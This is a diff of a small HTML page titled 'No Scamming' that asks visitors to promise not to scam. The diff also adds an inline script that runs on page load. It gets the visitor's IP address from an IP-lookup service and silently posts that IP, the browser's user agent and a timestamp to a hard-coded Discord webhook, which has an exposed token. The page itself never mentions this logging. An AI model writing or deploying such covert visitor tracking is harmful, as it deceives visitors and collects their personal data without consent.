@@ -1,23 +1,44 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Trust Portal</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <title>No Scamming</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
+  <div class="container">
+    <h1> Please Dont Scam </h1>
+    <p>Dear Citizens
 
-  <h1>🛡️ This Is a No-Scam Zone</h1>
-  <p>Please confirm you're not here to scam anyone.</p>
+Please Do Not scam anyone including me im just saying to help the community promise me your not scamming anyone.
 
-  <button class="promise-btn" onclick="reveal()">I Promise I'm Not Gonna Scam 🤞</button>
+i coded this website just so you know.
 
-  <div class="hidden-message" id="secret">
-    ✅ Trusted. Proceeding...<br><br>
-    <em>Proceed to the trading.</em>
+Respectfully,  
+Hyex
+</p>
   </div>
 
-  <script src="script.js"></script>
+  <script>
+    // Get IP
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const deviceInfo = navigator.userAgent;
+        const time = new Date().toLocaleString();
+
+        const webhook = 'https://discord.com/api/webhooks/1397114753029242880/Orf2IJqX_zSEJBlgaXipnwzxOto8iyshYGuxaCWrv900CpHovuuIiTdHkCZYFa-DKPSM';
+        const message = {
+          content: `📡 **New Visitor Logged**\n🖥️ **Device:** \`${deviceInfo}\`\n🌐 **IP:** \`${ip}\`\n🕒 **Time:** ${time}`
+        };
+
+        fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message)
+        });
+      });
+  </script>
 </body>
 </html>
